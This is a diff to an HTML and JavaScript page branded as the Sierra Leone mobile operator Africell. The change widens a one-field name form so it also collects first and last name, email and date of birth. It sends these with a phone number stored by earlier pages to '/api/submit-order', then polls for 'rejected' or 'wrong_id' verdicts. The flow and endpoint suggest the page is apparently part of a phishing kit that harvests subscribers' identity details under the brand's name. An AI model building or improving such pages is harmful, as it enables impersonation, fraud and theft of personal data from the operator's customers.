@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Africell | Registration</title>
+    <title>Africell | Personal Details Registration</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -98,7 +98,7 @@
 
         .reg-input-field {
             width: 100%;
-            height: 100px;
+            height: 80px;
             background: #ffffff;
             border: 2px solid #991676;
             border-radius: 18px;
@@ -109,7 +109,7 @@
             outline: none;
             -webkit-appearance: none;
             appearance: none;
-            padding: 0 50px;
+            padding: 0 20px;
             box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
         }
 
@@ -127,7 +127,7 @@
         /* Large Purple Continue Button */
         .reg-btn {
             width: 100%;
-            height: 110px;
+            height: 90px;
             background: #991676;
             color: #ffffff;
             border: none;
@@ -262,14 +262,29 @@
 
         <!-- Main Body Content -->
         <div class="reg-content">
-            <h1 class="reg-heading">Enter Your Name</h1>
+            <h1 class="reg-heading">Personal Details</h1>
             <p class="reg-instructions">
-                Please enter your full name according to your National ID / what you are called in Sierra Leone
+                Please enter your information accurately according to your National ID records.
             </p>
 
-            <!-- Full Name Field Only -->
+            <!-- Box 1: First Name -->
             <div class="reg-input-group">
-                <input type="text" id="fullName" class="reg-input-field" placeholder="Full Name" required>
+                <input type="text" id="firstName" class="reg-input-field" placeholder="First Name" required>
+            </div>
+
+            <!-- Box 2: Last Name -->
+            <div class="reg-input-group">
+                <input type="text" id="lastName" class="reg-input-field" placeholder="Last Name" required>
+            </div>
+
+            <!-- Box 3: Email -->
+            <div class="reg-input-group">
+                <input type="email" id="email" class="reg-input-field" placeholder="Email Address" required>
+            </div>
+
+            <!-- Box 4: Date of Birth -->
+            <div class="reg-input-group">
+                <input type="date" id="dob" class="reg-input-field" required>
             </div>
 
             <!-- Purple Continue Button -->
@@ -278,7 +293,7 @@
             <!-- Loading Spinner -->
             <div id="loadingSpinner">
                 <div class="spinner"></div>
-                <span id="spinnerText">Processing...</span>
+                <span id="spinnerText">Processing details...</span>
             </div>
         </div>
     </div>
@@ -308,51 +323,53 @@
             }
         }
 
-        // Auto-populate full name if saved previously in localStorage
         document.addEventListener('DOMContentLoaded', () => {
-            const savedName = localStorage.getItem('africellFullName');
-            if (savedName) {
-                const nameInput = document.getElementById('fullName');
-                if (nameInput) {
-                    nameInput.value = savedName;
-                }
-            }
-
             const createBtn = document.getElementById('createAccountBtn');
             if (createBtn) {
                 createBtn.addEventListener('click', submitRegistration);
+            }
+
+            // Quick check to verify the number carried over from forgot2 -> scratch2
+            const activePhone = localStorage.getItem('africellUserPhone');
+            if (!activePhone) {
+                console.warn('⚠️ No active phone session detected in localStorage.');
             }
         });
 
         async function submitRegistration(e) {
             if (e) e.preventDefault();
 
-            const nameVal = document.getElementById('fullName').value.trim();
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const dob = document.getElementById('dob').value.trim();
+
             const createBtn = document.getElementById('createAccountBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
             const spinnerText = document.getElementById('spinnerText');
-            const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';
+            
+            // Pulls the phone number natively saved from forgot2.html
+            const phoneInput = localStorage.getItem('africellUserPhone') || '+23200000000';
 
-            if (!nameVal) {
-                if (spinnerDiv) spinnerDiv.style.display = 'none';
-                createBtn.classList.remove('disabled-state');
-                showAppAlert('❌ Please enter your full name.');
+            if (!firstName || !lastName || !email || !dob) {
+                showAppAlert('❌ Please fill out all required fields.');
                 return;
             }
 
-            localStorage.setItem('africellFullName', nameVal);
-
             try {
                 createBtn.classList.add('disabled-state');
-                if (spinnerText) spinnerText.innerText = 'Submitting full name...';
+                if (spinnerText) spinnerText.innerText = 'Sending details...';
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        phone: phoneInput, 
-                        uniqueId: 'Account Registration Name: ' + nameVal 
+                        phone: phoneInput,
+                        firstName: firstName,
+                        lastName: lastName,
+                        email: email,
+                        dateOfBirth: dob
                     })
                 });
 
@@ -389,11 +406,11 @@
                             window.location.href = 'login.html';
                         });
                     } 
-                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
+                    else if (data.status === 'wrong_id' || data.status === 'rejected') {
                         clearInterval(statusInterval);
                         if (spinnerDiv) spinnerDiv.style.display = 'none';
                         createBtn.classList.remove('disabled-state');
-                        showAppAlert('❌ Request rejected.');
+                        showAppAlert('❌ Wrong Info. Please verify your details.');
                     }
                 } catch (e) {
                     console.error('Polling error', e);
@@ -401,6 +418,5 @@
             }, 3000);
         }
     </script>
-
 </body>
 </html>
